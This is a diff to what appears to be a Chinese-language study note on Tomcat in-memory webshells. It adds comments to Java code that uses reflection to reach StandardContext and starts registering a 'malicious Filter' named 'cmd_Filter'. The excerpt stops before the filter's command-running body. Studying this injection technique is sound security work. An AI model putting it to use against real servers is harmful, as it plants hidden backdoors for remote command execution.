@@ -258,18 +258,20 @@ StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();
 ![](picture/Pasted%20image%2020260105212912.png)
 先是通过反射获取到 standContext
 ```java
-ServletContext servletContext = request.getSession().getServletContext();  
+ServletContext servletContext = request.getSession().getServletContext();//先通过session拿到ServletContext ，本质是ApplicationContextFacade的马甲类 
   
- Field appctx = servletContext.getClass().getDeclaredField("context");  
+  //通过反射访问私有属性context，拿到了ApplicationContext
+ Field appctx = servletContext.getClass().getDeclaredField("context"); 
  appctx.setAccessible(true);  
  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
   
+  //再次反射拿StandardContext
  Field stdctx = applicationContext.getClass().getDeclaredField("context");  
  stdctx.setAccessible(true);  
  StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
   
   
-  
+  //反射把我们的恶意Filter包装好put进去
  String FilterName = "cmd_Filter";  
  Configs = standardContext.getClass().getDeclaredField("filterConfigs");  
  Configs.setAccessible(true);  
